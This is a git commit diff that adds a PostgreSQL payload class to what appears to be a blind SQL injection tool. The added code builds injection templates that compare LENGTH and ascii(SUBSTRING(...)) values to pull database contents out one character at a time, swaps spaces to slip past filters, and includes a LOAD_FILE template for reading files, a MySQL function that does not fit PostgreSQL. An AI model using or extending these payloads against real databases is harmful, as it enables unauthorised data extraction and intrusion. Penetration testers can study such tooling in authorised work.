73057195144e7431887b5879f9d1f16f35062db0
neuronaddict <dev@lacourarie.org>
2019-10-13 23:28:15 +0200

    PGSQL payloads

--- pyic/payloads.py
+++ pyic/payloads.py
@@ -62,6 +62,7 @@ class SqlitePayloads:
     def one_line_query(self, column, table, where='', offset=0):
         return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)
 
+
 class HSQLDBPayloads:
 
     def __init__(self, prefix='', space=' '):
@@ -80,3 +81,27 @@ class HSQLDBPayloads:
 
     def one_line_query(self, column, table, where='', offset=0):
         return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)
+
+
+class PGSQLPayloads:
+
+    def __init__(self, prefix='', space=' '):
+        self.prefix = prefix
+        self.space = space
+
+        self.and_size_eq = self.prefix + self.space + "LENGTH({})={}"
+        self.and_size_lt = self.prefix + self.space + "LENGTH({})<{}"
+        self.and_size_gt = self.prefix + self.space + "LENGTH({})>{}"
+
+        self.and_char_at_is = self.prefix + self.space + "ascii(SUBSTRING({},{},1))={}"
+        self.and_char_at_lt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))<{}"
+        self.and_char_at_gt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))>{}"
+
+        self.str_file = "(LOAD_FILE({}))"
+
+    def one_line_query(self, column, table, where='', offset=0):
+        return "(SELECT{0}{1}{0}from{0}{2}{0}{3}{0}LIMIT{0}1{0}OFFSET{0}{4})".format(self.space, column, table, where,
+                                                                                     offset)
+
+    def where(self, param, value):
+        return "WHERE{0}{1}={2}".format(self.space, param, value)
